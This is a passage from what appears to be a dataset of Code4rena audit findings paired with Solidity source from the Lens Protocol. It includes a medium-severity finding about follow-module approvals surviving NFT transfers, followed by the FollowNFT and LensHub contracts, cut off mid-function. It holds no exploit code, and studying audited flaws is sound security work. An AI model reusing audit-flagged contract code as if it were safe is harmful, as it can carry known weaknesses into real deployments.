                "Description": "\nApprovalFollowModule.sol#L32(https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/modules/follow/ApprovalFollowModule.sol#L32)<br\n\nThe ApprovalFollowModule.approve function is indexed by both (owner = IERC721(HUB).ownerOf(profileId), profileId) in case the profileId NFT is transferred.<br\nHowever, upon transfer, the old approvals are not cleared.\n\nThis can lead to similar issues as OpenSea not cancelling their sale offers upon NFT transfer.<br\nWhen the NFT is at some point transferred back to the original owner, all the old approvals are still intact which might not be expected by the owner.\n\n",
                "Repair": "\nConsider resetting all approvals upon transfer.\n\nZer0dot (Aave Lens) disputed and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1039792144):\n  This is known and acceptable, users should be able to check their approvals even if they don't have the profile.\n\n  Paging @oneski if you have any input.\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1118551248):\n  I think this issue is entirely valid, it should not be on the users to manage their approvals so much. It would be much safer to wipe approvals on transfers and avoid this issue altogether.\n\n  Keeping this issue open and as is.\n\ndonosonaumczuk (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125224994):\n  I would say wiping on transfers is a bit annoying as I could be transferring my profile between two addresses I own. It would be a better alternative to wipe on re-initialization by passing a boolean keepPreviousState flag (or something similar).\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125580300):\n  So after some more discussion, I think the points here are valid, but we were aware of this from the beginning. There are pros and cons to maintaining state. This module will not be present at launch and further iteration can modify it. Unfortunately there is no profile NFT transfer hook in follow modules currently. As this is still in my eyes not a direct vulnerability but more a caveat of how this specific system is designed, I would no longer dispute it but I would mark it as a low severity issue.\n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1125798004):\n  While I agree with you that giving users the ability to save the previous state on transfer makes sense and understand that the necessary changes to do this can be put in place in the future. I think its best I stay consistent with the judging rulebook as per below:<br\n \n 2 \u2014 Med (M): vulns have a risk of 2 and are considered \u201cMedium\u201d severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n \n I believe the functionality of the protocol is impacted in this scenario so I think its fair to keep this as medium risk.\n\nZer0dot (Aave Lens) acknowledged and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/22#issuecomment-1126098865):\n  Sounds fair, acknowledging. This is something we're going to look into deeper for newer or updated functionality (we won't be deploying this module yet).\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {IFollowNFT} from '../interfaces/IFollowNFT.sol';\nimport {IFollowModule} from '../interfaces/IFollowModule.sol';\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {IERC721Metadata} from '@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol';\n\n/**\n * @title FollowNFT\n * @author Lens Protocol\n *\n * @notice This contract is the NFT that is minted upon following a given profile. It is cloned upon first follow for a\n * given profile, and includes built-in governance power and delegation mechanisms.\n *\n * NOTE: This contract assumes total NFT supply for this follow NFT will never exceed 2^128 - 1\n */\ncontract FollowNFT is LensNFTBase, IFollowNFT {\n    struct Snapshot {\n        uint128 blockNumber;\n        uint128 value;\n    }\n\n    address public immutable HUB;\n\n    bytes32 internal constant DELEGATE_BY_SIG_TYPEHASH =\n        0xb8f190a57772800093f4e2b186099eb4f1df0ed7f5e2791e89a4a07678e0aeff;\n    // keccak256(\n    // 'DelegateBySig(address delegator,address delegatee,uint256 nonce,uint256 deadline)'\n    // );\n\n    mapping(address => mapping(uint256 => Snapshot)) internal _snapshots;\n    mapping(address => address) internal _delegates;\n    mapping(address => uint256) internal _snapshotCount;\n    mapping(uint256 => Snapshot) internal _delSupplySnapshots;\n    uint256 internal _delSupplySnapshotCount;\n    uint256 internal _profileId;\n    uint256 internal _tokenIdCounter;\n\n    bool private _initialized;\n\n    // We create the FollowNFT with the pre-computed HUB address before deploying the hub.\n    constructor(address hub) {\n        HUB = hub;\n    }\n\n    /// @inheritdoc IFollowNFT\n    function initialize(\n        uint256 profileId,\n        string calldata name,\n        string calldata symbol\n    ) external override {\n        if (_initialized) revert Errors.Initialized();\n        _initialized = true;\n        _profileId = profileId;\n        super._initialize(name, symbol);\n        emit Events.FollowNFTInitialized(profileId, block.timestamp);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function mint(address to) external override {\n        if (msg.sender != HUB) revert Errors.NotHub();\n        uint256 tokenId = ++_tokenIdCounter;\n        _mint(to, tokenId);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function delegate(address delegatee) external override {\n        _delegate(msg.sender, delegatee);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function delegateBySig(\n        address delegator,\n        address delegatee,\n        DataTypes.EIP712Signature calldata sig\n    ) external override {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            DELEGATE_BY_SIG_TYPEHASH,\n                            delegator,\n                            delegatee,\n                            sigNonces[delegator]++,\n                            sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n        _validateRecoveredAddress(digest, delegator, sig);\n        _delegate(delegator, delegatee);\n    }\n\n    /// @inheritdoc IFollowNFT\n    function getPowerByBlockNumber(address user, uint256 blockNumber)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        if (blockNumber > block.number) revert Errors.BlockNumberInvalid();\n\n        uint256 snapshotCount = _snapshotCount[user];\n\n        if (snapshotCount == 0) {\n            return 0; // Returning zero since this means the user never delegated and has no power\n        }\n\n        uint256 lower = 0;\n        uint256 upper = snapshotCount - 1;\n\n        // First check most recent balance\n        if (_snapshots[user][upper].blockNumber <= blockNumber) {\n            return _snapshots[user][upper].value;\n        }\n\n        // Next check implicit zero balance\n        if (_snapshots[user][lower].blockNumber > blockNumber) {\n            return 0;\n        }\n\n        while (upper > lower) {\n            uint256 center = upper - (upper - lower) / 2;\n            Snapshot memory snapshot = _snapshots[user][center];\n            if (snapshot.blockNumber == blockNumber) {\n                return snapshot.value;\n            } else if (snapshot.blockNumber < blockNumber) {\n                lower = center;\n            } else {\n                upper = center - 1;\n            }\n        }\n        return _snapshots[user][lower].value;\n    }\n\n    /// @inheritdoc IFollowNFT\n    function getDelegatedSupplyByBlockNumber(uint256 blockNumber)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        if (blockNumber > block.number) revert Errors.BlockNumberInvalid();\n\n        uint256 snapshotCount = _delSupplySnapshotCount;\n\n        if (snapshotCount == 0) {\n            return 0; // Returning zero since this means a delegation has never occurred\n        }\n\n        uint256 lower = 0;\n        uint256 upper = snapshotCount - 1;\n\n        // First check most recent delegated supply\n        if (_delSupplySnapshots[upper].blockNumber <= blockNumber) {\n            return _delSupplySnapshots[upper].value;\n        }\n\n        // Next check implicit zero balance\n        if (_delSupplySnapshots[lower].blockNumber > blockNumber) {\n            return 0;\n        }\n\n        while (upper > lower) {\n            uint256 center = upper - (upper - lower) / 2;\n            Snapshot memory snapshot = _delSupplySnapshots[center];\n            if (snapshot.blockNumber == blockNumber) {\n                return snapshot.value;\n            } else if (snapshot.blockNumber < blockNumber) {\n                lower = center;\n            } else {\n                upper = center - 1;\n            }\n        }\n        return _delSupplySnapshots[lower].value;\n    }\n\n    /**\n     * @dev This returns the follow NFT URI fetched from the hub.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        if (!_exists(tokenId)) revert Errors.TokenDoesNotExist();\n        return ILensHub(HUB).getFollowNFTURI(_profileId);\n    }\n\n    /**\n     * @dev Upon transfers, we move the appropriate delegations, and emit the transfer event in the hub.\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        address fromDelegatee = _delegates[from];\n        address toDelegatee =  _delegates[to];\n        address followModule = ILensHub(HUB).getFollowModule(_profileId);\n\n        _moveDelegate(fromDelegatee, toDelegatee, 1);\n\n        super._beforeTokenTransfer(from, to, tokenId);\n        ILensHub(HUB).emitFollowNFTTransferEvent(_profileId, tokenId, from, to);\n        if (followModule != address(0)) {\n            IFollowModule(followModule).followModuleTransferHook(_profileId, from, to, tokenId);\n        }\n    }\n\n    function _delegate(address delegator, address delegatee) internal {\n        uint256 delegatorBalance = balanceOf(delegator);\n        address previousDelegate = _delegates[delegator];\n        _delegates[delegator] = delegatee;\n        _moveDelegate(previousDelegate, delegatee, delegatorBalance);\n    }\n\n    function _moveDelegate(\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        unchecked {\n            if (from != address(0)) {\n                uint256 fromSnapshotCount = _snapshotCount[from];\n\n                // Underflow is impossible since, if from != address(0), then a delegation must have occurred (at least 1 snapshot)\n                uint256 previous = _snapshots[from][fromSnapshotCount - 1].value;\n                uint128 newValue = uint128(previous - amount);\n\n                _writeSnapshot(from, newValue, fromSnapshotCount);\n                emit Events.FollowNFTDelegatedPowerChanged(from, newValue, block.timestamp);\n            }\n\n            if (to != address(0)) {\n                // if from == address(0) then this is an initial delegation (add amount to supply)\n                if (from == address(0)) {\n                    // It is expected behavior that the `previousDelSupply` underflows upon the first delegation,\n                    // returning the expected value of zero\n                    uint256 delSupplySnapshotCount = _delSupplySnapshotCount;\n                    uint128 previousDelSupply = _delSupplySnapshots[delSupplySnapshotCount - 1]\n                        .value;\n                    uint128 newDelSupply = uint128(previousDelSupply + amount);\n                    _writeSupplySnapshot(newDelSupply, delSupplySnapshotCount);\n                }\n\n                // It is expected behavior that `previous` underflows upon the first delegation to an address,\n                // returning the expected value of zero\n                uint256 toSnapshotCount = _snapshotCount[to];\n                uint128 previous = _snapshots[to][toSnapshotCount - 1].value;\n                uint128 newValue = uint128(previous + amount);\n                _writeSnapshot(to, newValue, toSnapshotCount);\n                emit Events.FollowNFTDelegatedPowerChanged(to, newValue, block.timestamp);\n            } else {\n                // If from != address(0) then this is removing a delegation, otherwise we're dealing with a\n                // non-delegated burn of tokens and don't need to take any action\n                if (from != address(0)) {\n                    // Upon removing delegation (from != address(0) && to == address(0)), supply calculations cannot\n                    // underflow because if from != address(0), then a delegation must have previously occurred, so\n                    // the snapshot count must be >= 1 and the previous delegated supply must be >= amount\n                    uint256 delSupplySnapshotCount = _delSupplySnapshotCount;\n                    uint128 previousDelSupply = _delSupplySnapshots[delSupplySnapshotCount - 1]\n                        .value;\n                    uint128 newDelSupply = uint128(previousDelSupply - amount);\n                    _writeSupplySnapshot(newDelSupply, delSupplySnapshotCount);\n                }\n            }\n        }\n    }\n\n    function _writeSnapshot(\n        address owner,\n        uint128 newValue,\n        uint256 ownerSnapshotCount\n    ) internal {\n        unchecked {\n            uint128 currentBlock = uint128(block.number);\n            mapping(uint256 => Snapshot) storage ownerSnapshots = _snapshots[owner];\n\n            // Doing multiple operations in the same block\n            if (\n                ownerSnapshotCount != 0 &&\n                ownerSnapshots[ownerSnapshotCount - 1].blockNumber == currentBlock\n            ) {\n                ownerSnapshots[ownerSnapshotCount - 1].value = newValue;\n            } else {\n                ownerSnapshots[ownerSnapshotCount] = Snapshot(currentBlock, newValue);\n                _snapshotCount[owner] = ownerSnapshotCount + 1;\n            }\n        }\n    }\n\n    function _writeSupplySnapshot(uint128 newValue, uint256 supplySnapshotCount) internal {\n        unchecked {\n            uint128 currentBlock = uint128(block.number);\n\n            // Doing multiple operations in the same block\n            if (\n                supplySnapshotCount != 0 &&\n                _delSupplySnapshots[supplySnapshotCount - 1].blockNumber == currentBlock\n            ) {\n                _delSupplySnapshots[supplySnapshotCount - 1].value = newValue;\n            } else {\n                _delSupplySnapshots[supplySnapshotCount] = Snapshot(currentBlock, newValue);\n                _delSupplySnapshotCount = supplySnapshotCount + 1;\n            }\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {Helpers} from '../libraries/Helpers.sol';\nimport {DataTypes} from '../libraries/DataTypes.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {PublishingLogic} from '../libraries/PublishingLogic.sol';\nimport {InteractionLogic} from '../libraries/InteractionLogic.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\nimport {LensMultiState} from './base/LensMultiState.sol';\nimport {LensHubStorage} from './storage/LensHubStorage.sol';\nimport {VersionedInitializable} from '../upgradeability/VersionedInitializable.sol';\n\n/**\n * @title LensHub\n * @author Lens Protocol\n *\n * @notice This is the main entrypoint of the Lens Protocol. It contains governance functionality as well as\n * publishing and profile interaction functionality.\n *\n * NOTE: The Lens Protocol is unique in that frontend operators need to track a potentially overwhelming\n * number of NFT contracts and interactions at once. For that reason, we've made two quirky design decisions:\n *      1. Both Follow & Collect NFTs invoke an LensHub callback on transfer with the sole purpose of emitting an event.\n *      2. Almost every event in the protocol emits the current block timestamp, reducing the need to fetch it manually.\n */\ncontract LensHub is ILensHub, LensNFTBase, VersionedInitializable, LensMultiState, LensHubStorage {\n    uint256 internal constant REVISION = 1;\n\n    address internal immutable FOLLOW_NFT_IMPL;\n    address internal immutable COLLECT_NFT_IMPL;\n\n    /**\n     * @dev This modifier reverts if the caller is not the configured governance address.\n     */\n    modifier onlyGov() {\n        _validateCallerIsGovernance();\n        _;\n    }\n\n    /**\n     * @dev This modifier reverts if the caller is not a whitelisted profile creator address.\n     */\n    modifier onlyWhitelistedProfileCreator() {\n        _validateCallerIsWhitelistedProfileCreator();\n        _;\n    }\n\n    /**\n     * @dev The constructor sets the immutable follow & collect NFT implementations.\n     *\n     * @param followNFTImpl The follow NFT implementation address.\n     * @param collectNFTImpl The collect NFT implementation address.\n     */\n    constructor(address followNFTImpl, address collectNFTImpl) {\n        FOLLOW_NFT_IMPL = followNFTImpl;\n        COLLECT_NFT_IMPL = collectNFTImpl;\n    }\n\n    /// @inheritdoc ILensHub\n    function initialize(\n        string calldata name,\n        string calldata symbol,\n        address newGovernance\n    ) external override initializer {\n        super._initialize(name, symbol);\n        _setState(DataTypes.ProtocolState.Paused);\n        _setGovernance(newGovernance);\n    }\n\n    /// ***********************\n    /// *****GOV FUNCTIONS*****\n    /// ***********************\n\n    /// @inheritdoc ILensHub\n    function setGovernance(address newGovernance) external override onlyGov {\n        _setGovernance(newGovernance);\n    }\n\n    /// @inheritdoc ILensHub\n    function setEmergencyAdmin(address newEmergencyAdmin) external override onlyGov {\n        address prevEmergencyAdmin = _emergencyAdmin;\n        _emergencyAdmin = newEmergencyAdmin;\n        emit Events.EmergencyAdminSet(\n            msg.sender,\n            prevEmergencyAdmin,\n            newEmergencyAdmin,\n            block.timestamp\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setState(DataTypes.ProtocolState newState) external override {\n        if (msg.sender != _governance && msg.sender != _emergencyAdmin)\n            revert Errors.NotGovernanceOrEmergencyAdmin();\n        _setState(newState);\n    }\n\n    ///@inheritdoc ILensHub\n    function whitelistProfileCreator(address profileCreator, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _profileCreatorWhitelisted[profileCreator] = whitelist;\n        emit Events.ProfileCreatorWhitelisted(profileCreator, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistFollowModule(address followModule, bool whitelist) external override onlyGov {\n        _followModuleWhitelisted[followModule] = whitelist;\n        emit Events.FollowModuleWhitelisted(followModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistReferenceModule(address referenceModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _referenceModuleWhitelisted[referenceModule] = whitelist;\n        emit Events.ReferenceModuleWhitelisted(referenceModule, whitelist, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function whitelistCollectModule(address collectModule, bool whitelist)\n        external\n        override\n        onlyGov\n    {\n        _collectModuleWhitelisted[collectModule] = whitelist;\n        emit Events.CollectModuleWhitelisted(collectModule, whitelist, block.timestamp);\n    }\n\n    /// *********************************\n    /// *****PROFILE OWNER FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function createProfile(DataTypes.CreateProfileData calldata vars)\n        external\n        override\n        whenNotPaused\n        onlyWhitelistedProfileCreator\n    {\n        uint256 profileId = ++_profileCounter;\n        _mint(vars.to, profileId);\n        PublishingLogic.createProfile(\n            vars,\n            profileId,\n            _profileIdByHandleHash,\n            _profileById,\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModule(\n        uint256 profileId,\n        address followModule,\n        bytes calldata followModuleData\n    ) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        PublishingLogic.setFollowModule(\n            profileId,\n            followModule,\n            followModuleData,\n            _profileById[profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowModuleWithSig(DataTypes.SetFollowModuleWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_MODULE_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.followModule,\n                            keccak256(vars.followModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        PublishingLogic.setFollowModule(\n            vars.profileId,\n            vars.followModule,\n            vars.followModuleData,\n            _profileById[vars.profileId],\n            _followModuleWhitelisted\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcher(uint256 profileId, address dispatcher) external override whenNotPaused {\n        _validateCallerIsProfileOwner(profileId);\n        _setDispatcher(profileId, dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setDispatcherWithSig(DataTypes.SetDispatcherWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_DISPATCHER_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.dispatcher,\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setDispatcher(vars.profileId, vars.dispatcher);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURI(uint256 profileId, string calldata imageURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setProfileImageURI(profileId, imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setProfileImageURIWithSig(DataTypes.SetProfileImageURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_PROFILE_IMAGE_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.imageURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setProfileImageURI(vars.profileId, vars.imageURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURI(uint256 profileId, string calldata followNFTURI)\n        external\n        override\n        whenNotPaused\n    {\n        _validateCallerIsProfileOwnerOrDispatcher(profileId);\n        _setFollowNFTURI(profileId, followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function setFollowNFTURIWithSig(DataTypes.SetFollowNFTURIWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            SET_FOLLOW_NFT_URI_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.followNFTURI)),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _setFollowNFTURI(vars.profileId, vars.followNFTURI);\n    }\n\n    /// @inheritdoc ILensHub\n    function post(DataTypes.PostData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function postWithSig(DataTypes.PostWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            POST_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createPost(\n            vars.profileId,\n            vars.contentURI,\n            vars.collectModule,\n            vars.collectModuleData,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function comment(DataTypes.CommentData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createComment(vars);\n    }\n\n    /// @inheritdoc ILensHub\n    function commentWithSig(DataTypes.CommentWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COMMENT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            keccak256(bytes(vars.contentURI)),\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.collectModule,\n                            keccak256(vars.collectModuleData),\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createComment(\n            DataTypes.CommentData(\n                vars.profileId,\n                vars.contentURI,\n                vars.profileIdPointed,\n                vars.pubIdPointed,\n                vars.collectModule,\n                vars.collectModuleData,\n                vars.referenceModule,\n                vars.referenceModuleData\n            )\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirror(DataTypes.MirrorData calldata vars) external override whenPublishingEnabled {\n        _validateCallerIsProfileOwnerOrDispatcher(vars.profileId);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function mirrorWithSig(DataTypes.MirrorWithSigData calldata vars)\n        external\n        override\n        whenPublishingEnabled\n    {\n        address owner = ownerOf(vars.profileId);\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            MIRROR_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.profileIdPointed,\n                            vars.pubIdPointed,\n                            vars.referenceModule,\n                            keccak256(vars.referenceModuleData),\n                            sigNonces[owner]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, owner, vars.sig);\n        _createMirror(\n            vars.profileId,\n            vars.profileIdPointed,\n            vars.pubIdPointed,\n            vars.referenceModule,\n            vars.referenceModuleData\n        );\n    }\n\n    /**\n     * @notice Burns a profile, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burn()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burn(uint256 tokenId) public override whenNotPaused {\n        super.burn(tokenId);\n        _clearHandleHash(tokenId);\n    }\n\n    /**\n     * @notice Burns a profile with a signature, this maintains the profile data struct, but deletes the\n     * handle hash to profile ID mapping value.\n     *\n     * NOTE: This overrides the LensNFTBase contract's `burnWithSig()` function and calls it to fully burn\n     * the NFT.\n     */\n    function burnWithSig(uint256 tokenId, DataTypes.EIP712Signature calldata sig)\n        public\n        override\n        whenNotPaused\n    {\n        super.burnWithSig(tokenId, sig);\n        _clearHandleHash(tokenId);\n    }\n\n    /// ***************************************\n    /// *****PROFILE INTERACTION FUNCTIONS*****\n    /// ***************************************\n\n    /// @inheritdoc ILensHub\n    function follow(uint256[] calldata profileIds, bytes[] calldata datas)\n        external\n        override\n        whenNotPaused\n    {\n        InteractionLogic.follow(\n            msg.sender,\n            profileIds,\n            datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function followWithSig(DataTypes.FollowWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32[] memory dataHashes = new bytes32[](vars.datas.length);\n        for (uint256 i = 0; i < vars.datas.length; ++i) {\n            dataHashes[i] = keccak256(vars.datas[i]);\n        }\n\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            FOLLOW_WITH_SIG_TYPEHASH,\n                            keccak256(abi.encodePacked(vars.profileIds)),\n                            keccak256(abi.encodePacked(dataHashes)),\n                            sigNonces[vars.follower]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.follower, vars.sig);\n        InteractionLogic.follow(\n            vars.follower,\n            vars.profileIds,\n            vars.datas,\n            FOLLOW_NFT_IMPL,\n            _profileById,\n            _profileIdByHandleHash\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collect(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override whenNotPaused {\n        InteractionLogic.collect(\n            msg.sender,\n            profileId,\n            pubId,\n            data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function collectWithSig(DataTypes.CollectWithSigData calldata vars)\n        external\n        override\n        whenNotPaused\n    {\n        bytes32 digest;\n        unchecked {\n            digest = keccak256(\n                abi.encodePacked(\n                    '\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COLLECT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.pubId,\n                            keccak256(vars.data),\n                            sigNonces[vars.collector]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.collector, vars.sig);\n        InteractionLogic.collect(\n            vars.collector,\n            vars.profileId,\n            vars.pubId,\n            vars.data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function emitFollowNFTTransferEvent(\n        uint256 profileId,\n        uint256 followNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedFollowNFT = _profileById[profileId].followNFT;\n        if (msg.sender != expectedFollowNFT) revert Errors.CallerNotFollowNFT();\n        emit Events.FollowNFTTransferred(profileId, followNFTId, from, to, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function emitCollectNFTTransferEvent(\n        uint256 profileId,\n        uint256 pubId,\n        uint256 collectNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedCollectNFT = _pubByIdByProfile[profileId][pubId].collectNFT;\n        if (msg.sender != expectedCollectNFT) revert Errors.CallerNotCollectNFT();\n        emit Events.CollectNFTTransferred(\n            profileId,\n            pubId,\n            collectNFTId,\n            from,\n            to,\n            block.timestamp\n        );\n    }\n\n    /// *********************************\n    /// *****EXTERNAL VIEW FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function isProfileCreatorWhitelisted(address profileCreator)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _profileCreatorWhitelisted[profileCreator];\n    }\n\n    /// @inheritdoc ILensHub\n    function isFollowModuleWhitelisted(address followModule) external view override returns (bool) {\n        return _followModuleWhitelisted[followModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isReferenceModuleWhitelisted(address referenceModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _referenceModuleWhitelisted[referenceModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function 